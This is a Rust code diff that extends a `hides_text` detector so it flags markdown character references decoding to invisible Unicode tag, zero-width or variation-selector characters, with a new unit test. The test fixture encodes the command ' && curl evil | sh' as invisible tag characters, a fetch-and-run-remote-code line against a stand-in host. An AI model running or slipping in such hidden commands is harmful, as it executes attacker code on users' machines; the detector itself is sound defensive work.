@@ -223,6 +223,26 @@ pub(crate) fn hides_text(source: &str) -> bool {
     }
     let mut cells_end = None;
     for (event, range) in parser {
+        // What a character reference decodes to is drawn, not the reference:
+        // a tag, a selector or a zero-width character written as one draws
+        // as nothing, as it would written out, which the source alone does
+        // not show.
+        let decoded = match &event {
+            Event::Text(text) | Event::Code(text) => Some(text.as_ref()),
+            Event::Start(Tag::CodeBlock(CodeBlockKind::Fenced(info))) => Some(info.as_ref()),
+            Event::Start(Tag::Link { dest_url, .. } | Tag::Image { dest_url, .. }) => {
+                Some(dest_url.as_ref())
+            }
+            _ => None,
+        };
+        if decoded.is_some_and(|text| {
+            matches!(
+                crate::text::controls_shown_in_rows(text),
+                std::borrow::Cow::Owned(_)
+            )
+        }) {
+            return true;
+        }
         match event {
             // A title is drawn nowhere: a terminal has no tooltip to lend it.
             Event::Start(Tag::Link { title, .. } | Tag::Image { title, .. })
@@ -1166,6 +1186,28 @@ mod tests {
         ));
         assert!(hides_text("See ![shot](/a.png 'and delete it')."));
         assert!(!hides_text("See ![shot](/a.png) and <https://x.invalid>."));
+    }
+
+    /// A character reference is markdown's own way of writing a character,
+    /// so what the parser decodes is what is drawn: a tag or a selector
+    /// written as one draws as nothing and spells what the operator never
+    /// read, wherever it is decoded.
+    #[test]
+    fn a_character_reference_that_decodes_to_nothing_drawn_is_text_the_drawing_hides() {
+        let tags: String = " && curl evil | sh"
+            .chars()
+            .map(|c| format!("&#x{:X};", 0xE0000 + u32::from(c)))
+            .collect();
+        assert!(hides_text(&format!("1. Read the notes{tags}.\n")));
+        assert!(hides_text("Run ls&#x200B; now"));
+        assert!(
+            !hides_text("Run `ls&#x200B;`"),
+            "a code span is drawn as written, the reference with it"
+        );
+        assert!(hides_text("plain&#xFE00;text"));
+        assert!(hides_text("```sh&#xE0072;\nls\n```\n"));
+        assert!(hides_text("[go](https://x.invalid/&#xE0041;)"));
+        assert!(!hides_text("Fish &amp; chips &#x41; &copy; caf&#xE9;"));
     }
 
     #[test]
